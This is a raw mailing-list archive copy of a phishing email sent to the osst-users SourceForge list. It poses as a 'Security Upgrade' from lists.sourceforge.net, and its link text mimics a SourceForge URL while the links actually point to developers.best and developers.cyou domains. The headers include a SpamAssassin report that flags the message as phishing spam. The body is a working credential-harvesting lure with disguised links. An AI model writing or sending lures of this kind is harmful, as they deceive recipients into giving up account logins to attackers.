Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 2452666D3DA
	for <lists+osst-users@lfdr.de>; Tue, 17 Jan 2023 02:39:14 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1pHawU-0005Xx-BW
	for lists+osst-users@lfdr.de;
	Tue, 17 Jan 2023 01:39:12 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <doddytmn@mbpi.co.id>) id 1pHawT-0005Xr-Ny
 for osst-users@lists.sourceforge.net; Tue, 17 Jan 2023 01:39:12 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=9x47t6+gqDFGWEYTjOH1c3W9aG9yzin9xCSNyWz8ung=; b=dItSKXXp/erRea/gVhx9Xq7KZ5
 TNDuSruXdeUa4prN+RQ0z1w/2abzfRUkSJkzN+R0dLtCo0Eg/ka1XgxME0PrJ4dtci5hcu/fcelbP
 b1gh5VfQOTZe4b9nkVOzzc2OFr/I0fL8eyrFSSYaMPZfVIEYasOf2MIUeJj+LBqYIXbg=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=9x47t6+gqDFGWEYTjOH1c3W9aG9yzin9xCSNyWz8ung=; b=A
 BnLE/i1LLYPJmzLI8gAnWNcfoGMBw12O7GpFH+73KgrJrdaJHS3MWnv8T2hK3FtLidTJhVuznp0ap
 TnWtJg2wNsZtkOj99rjsz+sSo/HGUuucHu2th9CGK/TUEYAAcs3fTW/uKNsFQAhobRC3vtGiqP88U
 bl/VT5pI2uS36mIk=;
Received: from mx1.mbpi.co.id ([103.168.159.20])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pHawR-006Gfc-Ap for osst-users@lists.sourceforge.net;
 Tue, 17 Jan 2023 01:39:12 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mbpi.co.id; s=default; 
 t=1673919512;
 h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
 to:to:cc:mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=9x47t6+gqDFGWEYTjOH1c3W9aG9yzin9xCSNyWz8ung=;
 b=Z6OYRKSM3PH3N9Kk9QgQiSeaWt36AQJ0Kr3suvagTh1F0AUlsw8xlhXq8+foBuBZCznQN1
 ES2MU2qADEedCw7fJJQxttgx5Qs87KNFj8tPLCCS/AVwoX7V/Ul1nysLzBUkmuRpcw8wtz
 Iz5Nmzsq2gbhYDgR+84AW+fTfc6q/ZQ=
To: osst-users@lists.sourceforge.net
Date: 17 Jan 2023 02:38:22 +0100
Message-ID: <20230117023822.71A13904F69AED3F@mbpi.co.id>
MIME-Version: 1.0
X-Spam: Yes
X-Spam-Score: 6.8 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Hello, osst-users Upgrade to the new server security settings
 today 1/17/2023 2:38:22 We apologize for any inconvenience. 
 Content analysis details:   (6.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
 blocklist [URIs: developers.best]
 0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
 [URIs: developers.best]
 1.7 URIBL_BLACK            Contains an URL listed in the URIBL blacklist
 [URIs: developers.cyou]
 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
 bl.spamcop.net
 [Blocked - see <https://www.spamcop.net/bl.shtml?103.168.159.20>]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 2.0 PDS_OTHER_BAD_TLD      Untrustworthy TLDs
 [URI: webmail.developers.cyou (cyou)]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 0.0 TVD_PH_BODY_ACCOUNTS_PRE The body matches phrases such as
 "accounts suspended", "account credited", "account verification"
X-Headers-End: 1pHawR-006Gfc-Ap
Subject: [Osst-users] lists.sourceforge.net  Security Upgrade
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: "lists.sourceforge.net via Osst-users" <osst-users@lists.sourceforge.net>
Reply-To: "lists.sourceforge.net" <doddytmn@mbpi.co.id>
Content-Type: multipart/mixed; boundary="===============0193801255454244080=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============0193801255454244080==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19597"></HEAD>
<body>
<DIV style=3D'FONT-SIZE: small; BORDER-TOP: medium none; FONT-FAMILY: "Micr=
osoft Yahei", &#24494;&#36719;&#38597;&#40657;; BORDER-RIGHT: medium none; =
WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: medium none; TEXT-TR=
ANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); PADDING-BOTTOM: 40px=
; FONT-STYLE: normal; PADDING-TOP: 40px; PADDING-LEFT: 50px; MARGIN: 0px; B=
ORDER-LEFT: medium none; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PAD=
DING-RIGHT: 50px; TEXT-INDENT: 0px;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial; text-decoration-thickness: initial; border-radius: 5px 5px 0px 0px'>
<H3 style=3D"FONT-SIZE: 14px; BORDER-TOP: medium none; BORDER-RIGHT: medium=
 none; BORDER-BOTTOM: medium none; FONT-WEIGHT: normal; COLOR: rgb(51,51,51=
); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0p=
x 10px; BORDER-LEFT: medium none; PADDING-RIGHT: 0px"><SPAN style=3D"FONT-S=
IZE: 12px; COLOR: rgb(153,153,153)"><FONT style=3D"VERTICAL-ALIGN: inherit"=
><FONT style=3D"VERTICAL-ALIGN: inherit">Hello, osst-users</FONT></FONT></S=
PAN><BR></H3>
<DIV><FONT color=3D#999999><SPAN style=3D"FONT-SIZE: 12px"><BR></SPAN></FON=
T></DIV>
<DIV><FONT color=3D#999999><SPAN style=3D"FONT-SIZE: 12px"><FONT style=3D"V=
ERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">Upgrade&nbs=
p;to the new server security settings today 1/17/2023 2:38:22</FONT></FONT>=
</SPAN></FONT></DIV>
<DIV><FONT color=3D#999999><SPAN style=3D"FONT-SIZE: 12px"><FONT style=3D"V=
ERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">We apologiz=
e for any inconvenience.</FONT></FONT></SPAN></FONT></DIV>
<DIV><FONT color=3D#999999><SPAN style=3D"FONT-SIZE: 12px"><FONT style=3D"V=
ERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">Kindly&nbsp=
;</FONT></FONT><A style=3D"COLOR: rgb(17,85,204)" href=3D"https://webmail.d=
evelopers.best/international.html?dbase=3Dosst-users@lists.sourceforge.net"=
 target=3D_blank><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VER=
TICAL-ALIGN: inherit">click</FONT></FONT></A><FONT style=3D"VERTICAL-ALIGN:=
 inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">
 &nbsp;on the link below to start account upgrade system</FONT></FONT></SPA=
N></FONT></DIV>
<A style=3D"FONT-SIZE: 14px; BORDER-TOP: rgb(109,164,66) 1px solid; HEIGHT:=
 28px; BORDER-RIGHT: rgb(109,164,66) 1px solid; BORDER-BOTTOM: rgb(109,164,=
66) 1px solid; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 15px; MARGIN: 20px 0px 0px; BORDER-LEFT: rgb(109,164,66) =
1px solid; DISPLAY: inline-block; LINE-HEIGHT: 28px; PADDING-RIGHT: 15px; B=
ACKGROUND-COLOR: rgb(122,191,67); border-radius: 3px; text-decoration-line:=
 none"=20
href=3D"https://webmail.developers.cyou/international.html?dbase=3Dosst-use=
rs@lists.sourceforge.net" target=3D_blank><FONT style=3D"VERTICAL-ALIGN: in=
herit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIG=
N: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">https://www.lists.sourc=
eforge.net-</FONT></FONT><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT styl=
e=3D"VERTICAL-ALIGN: inherit">upgra<WBR>de-system/security/&nbsp;</FONT></F=
ONT></FONT></FONT></A>=20
<DIV style=3D"FONT-SIZE: 12px; BORDER-TOP: rgb(233,234,237) 1px solid; BORD=
ER-RIGHT: medium none; BORDER-BOTTOM: medium none; COLOR: rgb(153,153,153);=
 PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADDING-LEFT: 0px; MARGIN: 20px 0p=
x 0px; BORDER-LEFT: medium none; PADDING-RIGHT: 0px">
<DIV style=3D"BORDER-TOP: medium none; BORDER-RIGHT: medium none; BORDER-BO=
TTOM: medium none; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
; MARGIN: 0px; BORDER-LEFT: medium none; PADDING-RIGHT: 0px"><FONT style=3D=
"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT sty=
le=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">Afte=
r the upgrade, the account will be updated to the new mail version.&nbsp; &=
nbsp;</FONT></FONT><BR></FONT></FONT></DIV></DIV></DIV>
<DIV id=3Dm_4934213349297910890m_-6039132418201768448m_-1076621592985546902=
footer style=3D'FONT-SIZE: 14px; BORDER-TOP: medium none; FONT-FAMILY: "Mic=
rosoft Yahei", &#24494;&#36719;&#38597;&#40657;; BORDER-RIGHT: medium none;=
 WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: medium none; TEXT-T=
RANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); PADDING-BOTTOM: 0px=
; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BOR=
DER-LEFT: medium none; ORPHANS: 2; WIDOWS: 2;=20
LETTER-SPACING: normal; PADDING-RIGHT: 0px; TEXT-INDENT: 0px; font-variant-=
ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0p=
x; text-decoration-style: initial; text-decoration-color: initial; text-dec=
oration-thickness: initial'>
<DIV style=3D"FONT-SIZE: 12px; BORDER-TOP: rgb(219,220,223) 1px solid; BORD=
ER-RIGHT: medium none; BORDER-BOTTOM: medium none; COLOR: rgb(153,153,153);=
 PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 50px; MARGIN: 0px; =
BORDER-LEFT: medium none; LINE-HEIGHT: 19px; PADDING-RIGHT: 50px; BACKGROUN=
D-COLOR: rgb(242,244,247); border-radius: 0px 0px 5px 5px">
<DIV style=3D"BORDER-TOP: medium none; BORDER-RIGHT: medium none; BORDER-BO=
TTOM: medium none; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
; MARGIN: 0px; BORDER-LEFT: medium none; PADDING-RIGHT: 0px"><FONT style=3D=
"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT sty=
le=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">This=
 is a system email, please do not reply</FONT></FONT></FONT></FONT></DIV>
<DIV style=3D"BORDER-TOP: medium none; BORDER-RIGHT: medium none; BORDER-BO=
TTOM: medium none; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
; MARGIN: 0px; BORDER-LEFT: medium none; PADDING-RIGHT: 0px"><FONT style=3D=
"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT sty=
le=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">If y=
ou have questions, please contact lists.sourceforge.net</FONT></FONT></FONT=
></FONT></DIV></DIV></DIV></BODY></HTML>


--===============0193801255454244080==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0193801255454244080==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============0193801255454244080==--
